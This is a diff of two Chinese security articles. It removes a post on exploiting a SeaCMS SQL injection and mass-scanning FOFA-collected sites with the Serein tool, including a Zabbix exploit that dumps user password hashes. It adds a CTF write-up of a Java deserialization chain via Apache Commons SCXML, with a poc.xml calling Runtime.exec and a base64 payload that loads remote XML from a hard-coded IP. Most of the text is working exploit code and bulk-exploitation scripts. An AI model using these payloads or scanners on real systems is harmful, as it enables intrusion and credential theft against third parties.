@@ -1,402 +1,365 @@
-# 浅谈代码审计+漏洞批量一把梭哈
+## 解题
 
-## 前言
+重要源码
 
-最近在学习src的挖掘，常规的src挖掘就是信息泄露，什么逻辑漏洞什么的，什么越权漏洞，但是说实话，挖掘起来不仅需要很多时间，而且还需要很多经验，当然其实还有一种挖掘的办法，就是利用刚出的1day去批量扫描，如果自己会代码审计的话，就再好不过了，下面给大家分享分享整个过程是怎么样的
+其实就一个main
 
-**文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。**
+```php
+import com.sun.net.httpserver.HttpServer;
+import com.sun.net.httpserver.HttpHandler;
+import com.sun.net.httpserver.HttpExchange;
 
-## 工具介绍
+import java.io.*;
+import java.net.InetSocketAddress;
+import java.util.Base64;
 
-项目地址https://github.com/W01fh4cker/Serein
+public class Test {
 
-【懒人神器】一款图形化、批量采集url、批量对采集的url进行各种nday检测的工具。可用于src挖掘、cnvd挖掘、0day利用、打造自己的武器库等场景。可以批量利用Actively Exploited Atlassian Confluence 0Day CVE-2022-26134和DedeCMS v5.7.87 SQL注入 CVE-2022-23337。
+    public static void main(String[] args) throws IOException {
+        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "8000"));
+        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
+        server.createContext("/", new RequestHandler());
+        server.start();
+        System.out.printf("Server listening on :%s\n", port);
+    }
 
-具体使用方法下面会介绍
+    static class RequestHandler implements HttpHandler {
+        @Override
+        public void handle(HttpExchange exchange) throws IOException {
+            String response;
+            int code = 200;
 
-## 漏洞样本
+            switch (exchange.getRequestURI().getPath()) {
+                case "/scxml":
+                    response = handleScxmlRequest(exchange);
+                    break;
+                default:
+                    code = 404;
+                    response = "Not found";
+                    break;
+            }
 
-本次选取的是一个前些天看到的seacms的一个sql注入，当时也是自己也审计了一波的
+            exchange.sendResponseHeaders(code, response.length());
+            try (OutputStream os = exchange.getResponseBody()) {
+                os.write(response.getBytes());
+            }
+        }
 
-这里给出审计的过程
+        private String handleScxmlRequest(HttpExchange exchange) {
+            String param = exchange.getRequestURI().getQuery();
+            if (param == null) {
+                return "No query parameter provided";
+            }
 
-### /js/player/dmplayer/dmku/index.php 未授权sql注入
-
-这个相比于上一个来说是危害更大，因为不需要登录admin用户
-
-![image-20240820170525672](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240820170525672.png)
-
-
-
-确实是sleep了，说明漏洞存在，我们看到代码
-
-```java
-if ($_GET['ac'] == "edit") {
-    $cid = $_POST['cid'] ?: showmessage(-1, null);
-    $data = $d->编辑弹幕($cid) ?:  succeedmsg(0, '完成');
-    exit;
+            try {
+                byte[] decodedBytes = Base64.getDecoder().decode(param);
+                try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decodedBytes))) {
+                    return ois.readObject().toString();
+                }
+            } catch (Throwable e) {
+                e.printStackTrace();
+                return ":(";
+            }
+        }
+    }
 }
 ```
 
-我们跟进编辑弹幕方法
+可以看见出口就是一个反序列化，然后会调用Tostring方法，这个就很奇怪，偏偏调用Tostring，全局查找tostring方法
 
-一路来到
+找到如下代码
 
-```java
-public static function 编辑_弹幕($cid)
-    {
+```php
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package com.n1ght;
+
+import java.io.Serializable;
+import java.util.Map;
+import org.apache.commons.scxml2.invoke.Invoker;
+import org.apache.commons.scxml2.invoke.InvokerException;
+
+public class InvokerImpl implements Serializable {
+    private final Invoker o;
+    private final String source;
+    private final Map params;
+
+    public InvokerImpl(Invoker o, String source, Map params) {
+        this.o = o;
+        this.source = source;
+        this.params = params;
+    }
+
+    public String toString() {
         try {
-            global $_config;
-            $text = $_POST['text'];
-            $color = $_POST['color'];
-            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
-            
-            $sql = "UPDATE sea_danmaku_list SET text='$text',color='$color' WHERE cid=$cid";
-            $result = "UPDATE sea_danmaku_report SET text='$text',color='$color' WHERE cid=$cid";
-            $conn->query($sql);
-            $conn->query($result);
-        } catch (PDOException $e) {
-            showmessage(-1, '数据库错误:' . $e->getMessage());
+            this.o.invoke(this.source, this.params);
+            return "success invoke";
+        } catch (InvokerException var2) {
+            throw new RuntimeException(var2);
         }
     }
+}
 ```
 
-这里我们可以看到查询又是使用的原生的query方法，所以并没有过滤
+很明显的特征了，调用任意对应的invoke方法
 
-所以导致sql注入
+逻辑只能是寻找实现了invoke接口的类了
 
-还有我们看到当ac=del，type=list的时候
+直接来到了SimpleSCXMLInvoker类
 
-```java
-else if ($_GET['ac'] == "del") {
-        $id = $_GET['id'] ?: succeedmsg(-1, null);
-        $type = $_GET['type'] ?: succeedmsg(-1, null);
-        $data = $d->删除弹幕($id) ?: succeedmsg(0, []);
-        succeedmsg(23, true);
-```
+查看它的invoke方法
 
-进入删除弹幕($id)
+```php
+public void invoke(String source, Map<String, Object> params) throws InvokerException {
+    SCXML scxml = null;
 
-```java
-public function 删除弹幕($id)
-    {
-        //sql::插入_弹幕($data);
-        sql::删除_弹幕数据($id);
+    try {
+        scxml = SCXMLReader.read(new URL(source));
+    } catch (ModelException var9) {
+        throw new InvokerException(var9.getMessage(), var9.getCause());
+    } catch (IOException var10) {
+        throw new InvokerException(var10.getMessage(), var10.getCause());
+    } catch (XMLStreamException var11) {
+        throw new InvokerException(var11.getMessage(), var11.getCause());
     }
-```
 
-进入sql::删除_弹幕数据($id);
+    Evaluator eval = this.parentSCInstance.getEvaluator();
+    this.executor = new SCXMLExecutor(eval, new SimpleDispatcher(), new SimpleErrorReporter());
+    Context rootCtx = eval.newContext((Context)null);
+    Iterator var6 = params.entrySet().iterator();
 
-```java
-public static function 删除_弹幕数据($id)
-    {
-        try {
-            global $_config;
-            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
-            $conn->set_charset('utf8');
-            if ($_GET['type'] == "list") {
-                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
-                $result = "DELETE FROM sea_danmaku_list WHERE cid={$id}";
-                $conn->query($sql);
-                $conn->query($result);
-            } else if ($_GET['type'] == "report") {
-                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
-                $conn->query($sql);
-            }
-        } catch (PDOException $e) {
-            showmessage(-1, '数据库错误:' . $e->getMessage());
-        }
+    while(var6.hasNext()) {
+        Map.Entry<String, Object> entry = (Map.Entry)var6.next();
+        rootCtx.setLocal((String)entry.getKey(), entry.getValue());
     }
-```
 
-我们的id是可以控制的，type也是可以控制的，而且没有任何的过滤，当type=list的时候，直接放进query函数进行查询
+    this.executor.setRootContext(rootCtx);
+    this.executor.setStateMachine(scxml);
+    this.executor.addListener(scxml, new SimpleSCXMLListener());
+    this.executor.registerInvokerClass("scxml", this.getClass());
 
-漏洞验证
-
-POC   
-
-```java
-GET /js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(6)))x)&type=list HTTP/1.1
-Host: seacms:8181
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://seacms:8181/js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(0)))x)&type=list
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: PHPSESSID=5dl35hp50uj606p52se8kg91a2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM
-Connection: keep-alive
-
-```
-
-效果如图，可以发现确实延迟了6秒
-
-![image-20240821015634118](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821015634118.png)
-
-## 工具利用过程
-
-首先就是看工具的逻辑是如何添加漏洞的
-
-首先看主文件
-
-代码很长，说一下我们需要注意的点，首先就是配置,对于的fofa配置如下
-
-需要你进入工具的时候配置邮箱和key
-
-```java
-def fofa_saveit_first():
-    email = fofa_text1.get()
-    key = fofa_text2.get()
-    with open("fofa配置.conf","a+") as f:
-        f.write(f"[data]\nemail={email}\nkey={key}")
-        f.close()
-    showinfo("保存成功！","请继续使用fofa搜索模块！下一次将自动读取，不再需要配置！")
-    text3.insert(END,f"【+】保存成功！请继续使用fofa搜索模块！下一次将会自动读取，不再需要配置！您的email是：{email}；为保护您的隐私，api-key不会显示。\n")
-    text3.see(END)
-    fofa_info.destroy()
-def fofa_saveit_twice():
-    global email_r,key_r
-    if not os.path.exists("fofa配置.conf"):
-        fofa_saveit_first()
-    else:
-        email_r = getFofaConfig("data", "email")
-        key_r = getFofaConfig("data", "key")
-def fofa_info():
-    global fofa_info,fofa_text1,fofa_text2,fofa_text3
-    fofa_info = tk.Tk()
-    fofa_info.title("fofa配置")
-    fofa_info.geometry('230x100')
-    fofa_info.resizable(0, 0)
-    fofa_info.iconbitmap('logo.ico')
-    fofa_email = tk.StringVar(fofa_info,value="填注册fofa的email")
-    fofa_text1 = ttk.Entry(fofa_info, bootstyle="success", width=30, textvariable=fofa_email)
-    fofa_text1.grid(row=0, column=1, padx=5, pady=5)
-    fofa_key = tk.StringVar(fofa_info,value="填email对应的key")
-    fofa_text2 = ttk.Entry(fofa_info, bootstyle="success", width=30, textvariable=fofa_key)
-    fofa_text2.grid(row=1, column=1, padx=5, pady=5)
-    button1 = ttk.Button(fofa_info, text="点击保存", command=fofa_saveit_twice, width=30, bootstyle="info")
-    button1.grid(row=2, column=1, padx=5, pady=5)
-    fofa_info.mainloop()
-```
-
-使用fofa的处理流程
-
-![image-20241018135727613](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018135727613.png)
-
-后续是通过fofa的api进行查询的，所以需要你的api，只有vip才有这个功能
-
-然后下面是脚本调用逻辑
-
-因为一个漏洞是需要你自己写一个python脚本的
-
-然后加入你自己自定义的漏洞是在
-
-![image-20241018140142362](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140142362.png)
-
-这个逻辑应该很好理解，比如我的就是
-
-```java
-button50 = ttk.Button(group3,text="seacms前台sql注入",command=sql_injection_gui,width=45,bootstyle="primary")
-button50.grid(row=15,column=2,columnspan=2,padx=5,pady=5)
-```
-
-然后就是写对应的利用脚本了
-
-因为我们写的脚本是需要贴合工具的，所以先随便找一个脚本看看大概的架构是怎么样的
-
-![image-20241018140341414](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140341414.png)
-
-工具自带了许许多多的利用脚本，我们看一下如何仿写
-
-比如zabbix_sql.py
-
-
-
-```java
-import requests
-import tkinter as tk
-from tkinter import scrolledtext
-from concurrent.futures import ThreadPoolExecutor
-from ttkbootstrap.constants import *
-"""
-Zabbix ‘popup.php’SQL注入漏洞
-http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201112-017
-Zabbix的popup.php中存在SQL注入漏洞。远程攻击者可借助only_hostid参数执行任意SQL命令。
-"""
-def zabbix_sql_exp(url):
-    poc = r"""popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=1))%20union%20select%201,group_concat(surname,0x2f,passwd)%20from%20users%23"""
-    target_url = url + poc
-    status_str = ['Administrator', 'User']
-    try:
-        res = requests.get(url, Verify=False,timeout=3)
-        if res.status_code == 200:
-            target_url_payload = f"{target_url}"
-            res = requests.get(url=target_url_payload,Verify=False)
-            if res.status_code == 200:
-                for i in range(len(status_str)):
-                    if status_str[i] in res.text:
-                        zabbix_sql.insert(END,"【*】存在漏洞的url：" + url + "\n")
-                        zabbix_sql.see(END)
-                        with open ("存在Zabbix—SQL注入漏洞的url.txt", 'a') as f:
-                            f.write(url + "\n")
-            else:
-                target_url = url + '/zabbix/' + poc
-                res = requests.get(url=target_url,verify=False)
-                for i in range(len(status_str)):
-                    if status_str[i] in res.text:
-                        zabbix_sql.insert(END, "【*】存在漏洞的url：" + url + "\n")
-                        zabbix_sql.see(END)
-                        with open("存在Zabbix—SQL注入漏洞的url.txt", 'a') as f:
-                            f.write(url + "\n")
-        else:
-            zabbix_sql.insert(END, "【×】不存在漏洞的url：" + url + "\n")
-            zabbix_sql.see(END)
-    except Exception as err:
-        zabbix_sql.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
-        zabbix_sql.see(END)
-def get_zabbix_addr():
-    with open("url.txt","r") as f:
-        for address in f.readlines():
-            address = address.strip()
-            yield address
-def zabbix_sql_gui():
-    zabbix_sql_poc = tk.Tk()
-    zabbix_sql_poc.geometry("910x450")
-    zabbix_sql_poc.title("Zabbix—SQL注入 漏洞一把梭")
-    zabbix_sql_poc.resizable(0, 0)
-    zabbix_sql_poc.iconbitmap('logo.ico')
-    global zabbix_sql
-    zabbix_sql = scrolledtext.ScrolledText(zabbix_sql_poc,width=123, height=25)
-    zabbix_sql.grid(row=0, column=0, padx=10, pady=10)
-    zabbix_sql.see(END)
-    addrs = get_zabbix_addr()
-    max_thread_num = 30
-    executor = ThreadPoolExecutor(max_workers=max_thread_num)
-    for addr in addrs:
-        future = executor.submit(zabbix_sql_exp, addr)
-    zabbix_sql_poc.mainloop()
-```
-
-大概的架构就是访问地址，发送paylaod，然后对应利用成功和失败的特征进行鉴定，然后就是最后的gui模块
-
-
-
-因此我们可以对应的写出一个脚本，我按照我的漏洞写出的脚本如下
-
-```java
-import requests
-import time
-import tkinter as tk
-from tkinter import scrolledtext
-from concurrent.futures import ThreadPoolExecutor
-from ttkbootstrap.constants import *
-
-
-# 执行SQL注入检测的函数
-def sql_injection_exp(url):
-    target = url + "/js/player/dmplayer/dmku/index.php?ac=edit"
-    data = {
-        "cid": "(select(1)from(select(sleep(6)))x)",
-        "text": "1",
-        "color": "1"
+    try {
+        this.executor.go();
+    } catch (ModelException var8) {
+        throw new InvokerException(var8.getMessage(), var8.getCause());
     }
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-        "Content-Type": "application/x-www-form-urlencoded"
+
+    if (this.executor.getCurrentStatus().isFinal()) {
+        TriggerEvent te = new TriggerEvent(this.eventPrefix + invokeDone, 3);
+        (new AsyncTrigger(this.parentSCInstance.getExecutor(), te)).start();
     }
-    start_time = time.time()
 
-    try:
-        response = requests.post(target, data=data, headers=headers, timeout=10)
-        elapsed_time = time.time() - start_time
-
-        if elapsed_time > 5:
-            output_text.insert(END, f"【*】找到SQL注入在 {target} (响应时间: {elapsed_time:.2f} 秒)\n")
-            output_text.see(END)
-            with open("找到sql注入的url.txt", 'a') as f:
-                f.write(url + "\n")
-        else:
-            output_text.insert(END, f"【×】没有SQL注入在 {target} (响应时间: {elapsed_time:.2f} 秒)\n")
-            output_text.see(END)
-    except requests.exceptions.RequestException as err:
-        output_text.insert(END, f"【×】目标请求失败：{target}，错误内容：{err}\n")
-        output_text.see(END)
-
-
-# 获取URL地址的生成器
-def get_urls():
-    with open('url.txt', 'r') as file:
-        for line in file.readlines():
-            yield line.strip()
-
-
-# GUI界面
-def sql_injection_gui():
-    root = tk.Tk()
-    root.geometry("910x450")
-    root.title("seacms前台sql注入")
-    root.resizable(0, 0)
-
-    global output_text
-    output_text = scrolledtext.ScrolledText(root, width=123, height=25)
-    output_text.grid(row=0, column=0, padx=10, pady=10)
-
-    urls = get_urls()
-    max_threads = 30  # 并发线程数
-    executor = ThreadPoolExecutor(max_workers=max_threads)
-
-    for url in urls:
-        future = executor.submit(sql_injection_exp, url)
-
-    root.mainloop()
-
-
+}
 ```
 
-然后添加好模块
+观察lib
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140643396.png)
+![image-20240912223117504](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912223117504.png)
 
-可以看见是添加成功了的
+发现是有scxml包的，而这个依赖是有个漏洞的
 
-## 实战演示
+参考一下这位师傅的分析https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/
 
-首先就是搜集url了，配置好了之后只需要
+关键内容如下
 
-![image-20241018140816637](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140816637.png)
+By convention, I eventually demostrate it with the explicit PoC.
 
-因为我没有fofa的会员，这里使用自己搜集的url，放在一个文件里面的，如果有的话就不需要我这样操作了
+```
+import org.apache.commons.scxml2.SCXMLExecutor;
+import org.apache.commons.scxml2.io.SCXMLReader;
+import org.apache.commons.scxml2.model.ModelException;
+import org.apache.commons.scxml2.model.SCXML;
 
-然后来到你需要利用的板块
+import javax.xml.stream.XMLStreamException;
+import java.io.IOException;
 
-![image-20241018140917514](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018140917514.png)
+public class SCXMLDemo {
+    public static void main(String[] args) throws ModelException, XMLStreamException, IOException {
+
+        // engine to execute the scxml instance
+        SCXMLExecutor executor = new SCXMLExecutor();
+        // parse SCXML URL into SCXML model
+        SCXML scxml = SCXMLReader.read("http://127.0.0.1:8000/poc.xml");
+
+        // set state machine (scxml instance) to execute
+        executor.setStateMachine(scxml);
+        executor.go();
+
+    }
+}
+```
+
+poc.xml
+
+```
+<?xml version="1.0"?>
+<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
+<state id="run">
+<onentry>
+<script>
+''.getClass().forName('java.lang.Runtime').getRuntime().exec('open -a calculator')
+</script>
+</onentry>
+</state>
+</scxml>
+```
+
+The screenshot of this illustration.
+![upload successful](https://blog.pyn3rd.com/images/pasted-237.png)
+
+就是可以加载远程的xml文件，实现命令执行
+
+那其实答案就呼之欲出了
+
+## 利用链构造
+
+构造过程中有很多报错，根据报错一个一个解决就好了
+
+首先就是SimpleSCXMLInvoker要为parentSCInstance属性赋值
+
+```php
+private SCInstance parentSCInstance;
+```
+
+查看构造方法
+
+```php
+void setEvaluator(Evaluator evaluator) {
+    this.evaluator = evaluator;
+}
+```
+
+继续查看Evaluator
+
+有四个实现类，因为这里给了Jexl依赖
+
+![image-20240912223615914](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912223615914.png)
+
+选用JexlEvaluator类
+
+```php
+public JexlEvaluator() {
+    this.jexlEngineSilent = this.jexlEngine.isSilent();
+    this.jexlEngineStrict = this.jexlEngine.isStrict();
+}
+```
+
+直接构造就ok
+
+然后就是对于params，其实不重要，只需要能够加载我的远程文件就好了
+
+然后就是source参数就是我们的远程地址
+
+```php
+http://ip:port/1.xml
+```
+
+## POC
+
+```php
+import com.n1ght.InvokerImpl;
+import org.apache.commons.scxml2.ErrorReporter;
+import org.apache.commons.scxml2.SCInstance;
+import org.apache.commons.scxml2.SCXMLExecutor;
+import org.apache.commons.scxml2.env.SimpleDispatcher;
+import org.apache.commons.scxml2.env.SimpleErrorReporter;
+import org.apache.commons.scxml2.env.jexl.JexlEvaluator;
+import org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;
+
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class ser {
+    public static void main(String[] args) throws Exception {
+        ErrorReporter errorReporter = new SimpleErrorReporter();
+        SimpleDispatcher simpleDispatcher = new SimpleDispatcher();
+        JexlEvaluator jexlEvaluator = new JexlEvaluator();
+        SCXMLExecutor scxmlExecutor = new SCXMLExecutor(jexlEvaluator, simpleDispatcher, errorReporter);
+        Class<?> clazz = Class.forName("org.apache.commons.scxml2.SCInstance");
+        Constructor<?> constructor = clazz.getDeclaredConstructor(SCXMLExecutor.class);
+        constructor.setAccessible(true);
+        SCInstance scInstance = (SCInstance) constructor.newInstance(scxmlExecutor);
+        SimpleSCXMLInvoker simpleSCXMLInvoker = new SimpleSCXMLInvoker();
+        setFieldValue(scInstance, "evaluator", jexlEvaluator);
+        setFieldValue(simpleSCXMLInvoker, "parentSCInstance", scInstance);
+
+        String source = "http://ip/1.xml";
+        Map<String, String> params = new HashMap<>();
+        params.put("username", "testUser");
+
+        // 实例化 InvokerImpl
+        InvokerImpl invokerImpl = new InvokerImpl(simpleSCXMLInvoker, source, params);
+
+        // 序列化 InvokerImpl 并转换为 Base64
+        String serializedBase64 = serializeToBase64(invokerImpl);
+        System.out.println("Serialized InvokerImpl to Base64: " + serializedBase64);
+
+        // 反序列化 InvokerImpl
+        InvokerImpl deserializedInvokerImpl = deserializeFromBase64(serializedBase64);
+        System.out.println("InvokerImpl deserialized successfully.");
+        deserializedInvokerImpl.toString();
+    }
+
+    public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
+        Class<?> clazz = obj.getClass();
+        Field fieldName = clazz.getDeclaredField(field);
+        fieldName.setAccessible(true);
+        fieldName.set(obj, value);
+    }
+
+    public static String serializeToBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(obj);
+        objectOutputStream.close();
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+
+    public static InvokerImpl deserializeFromBase64(String base64) throws IOException, ClassNotFoundException {
+        byte[] data = Base64.getDecoder().decode(base64);
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        return (InvokerImpl) objectInputStream.readObject();
+    }
+}
+```
+
+## 解题
+
+输出的内容如下
+
+```java
+rO0ABXNyABVjb20ubjFnaHQuSW52b2tlckltcGyTOSc2zqCsvwIAA0wAAW90ACpMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9pbnZva2UvSW52b2tlcjtMAAZwYXJhbXN0AA9MamF2YS91dGlsL01hcDtMAAZzb3VyY2V0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyADNvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmludm9rZS5TaW1wbGVTQ1hNTEludm9rZXIAAAAAAAAAAQIABVoACWNhbmNlbGxlZEwAC2V2ZW50UHJlZml4cQB+AANMAAhleGVjdXRvcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDWE1MRXhlY3V0b3I7TAAQcGFyZW50U0NJbnN0YW5jZXQAJkxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDSW5zdGFuY2U7TAANcGFyZW50U3RhdGVJZHEAfgADeHAAcHBzcgAkb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5TQ0luc3RhbmNlAAAAAAAAAAICAApMAAtjb21wbGV0aW9uc3EAfgACTAAIY29udGV4dHNxAH4AAkwACWV2YWx1YXRvcnQAJUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0V2YWx1YXRvcjtMAAhleGVjdXRvcnEAfgAGTAAJaGlzdG9yaWVzcQB+AAJMABRpbml0aWFsU2NyaXB0Q29udGV4dHQAI0xvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0NvbnRleHQ7TAAOaW52b2tlckNsYXNzZXNxAH4AAkwACGludm9rZXJzcQB+AAJMABRub3RpZmljYXRpb25SZWdpc3RyeXQAMExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL05vdGlmaWNhdGlvblJlZ2lzdHJ5O0wAC3Jvb3RDb250ZXh0cQB+AAt4cHNyACVqYXZhLnV0aWwuQ29sbGVjdGlvbnMkU3luY2hyb25pemVkTWFwG3P5CUtLOXsDAAJMAAFtcQB+AAJMAAVtdXRleHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ABB4c3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgATeHNyADBvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmVudi5qZXhsLkpleGxFdmFsdWF0b3IAAAAAAAAAAQIAAloAEGpleGxFbmdpbmVTaWxlbnRaABBqZXhsRW5naW5lU3RyaWN0eHAAAHNyACdvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLlNDWE1MRXhlY3V0b3IAAAAAAAAAAQIACFoACXN1cGVyU3RlcEwADWN1cnJlbnRTdGF0dXN0ACJMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9TdGF0dXM7TAANZXJyb3JSZXBvcnRlcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0Vycm9yUmVwb3J0ZXI7TAAPZXZlbnRkaXNwYXRjaGVydAArTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvRXZlbnREaXNwYXRjaGVyO0wAA2xvZ3QAIExvcmcvYXBhY2hlL2NvbW1vbnMvbG9nZ2luZy9Mb2c7TAAKc2NJbnN0YW5jZXEAfgAHTAAJc2VtYW50aWNzdAAqTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvU0NYTUxTZW1hbnRpY3M7TAAMc3RhdGVNYWNoaW5ldAAnTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvbW9kZWwvU0NYTUw7eHABc3IAIG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU3RhdHVzAAAAAAAAAAECAAJMAAZldmVudHN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247TAAGc3RhdGVzdAAPTGphdmEvdXRpbC9TZXQ7eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAB4c3IAMW9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuZW52LlNpbXBsZUVycm9yUmVwb3J0ZXIAAAAAAAAAAQIAAUwAA2xvZ3EAfgAbeHBzcgArb3JnLmFwYWNoZS5jb21tb25zLmxvZ2dpbmcuaW1wbC5KZGsxNExvZ2dlckJmt5/gKqC8AgABTAAEbmFtZXEAfgADeHB0ADFvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmVudi5TaW1wbGVFcnJvclJlcG9ydGVyc3IALm9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuZW52LlNpbXBsZURpc3BhdGNoZXIAAAAAAAAAAQIAAUwAA2xvZ3EAfgAbeHBzcQB+ACl0AClvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLkV2ZW50RGlzcGF0Y2hlcnNxAH4AKXQAJ29yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NYTUxFeGVjdXRvcnNxAH4ACXNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AM3hzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ADV4cQB+ABZxAH4AHnNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AN3hwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgA5eHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AO3hzcgAub3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5Ob3RpZmljYXRpb25SZWdpc3RyeQAAAAAAAAABAgABTAAEcmVnc3EAfgACeHBzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AD94cHNyADZvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLnNlbWFudGljcy5TQ1hNTFNlbWFudGljc0ltcGwAAAAAAAAAAQIAAkwABmFwcExvZ3EAfgAbTAAQdGFyZ2V0Q29tcGFyYXRvcnQAQExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL3NlbWFudGljcy9UcmFuc2l0aW9uVGFyZ2V0Q29tcGFyYXRvcjt4cHNxAH4AKXQAKG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NYTUxTZW1hbnRpY3NzcgA+b3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5zZW1hbnRpY3MuVHJhbnNpdGlvblRhcmdldENvbXBhcmF0b3IAAAAAAAAAAQIAAHhwcHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ASHhwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgBKeHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ATHhzcQB+AD1zcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AE94cHBzcQB+ABE/QAAAAAAADHcIAAAAEAAAAAF0AAh1c2VybmFtZXQACHRlc3RVc2VyeHQAIGh0dHA6Ly80Ny4xMDAuMjIzLjE3Mzo4MDAwLzEueG1s
+```
+
+xml内容如下
+
+```java
+<?xml version="1.0"?>
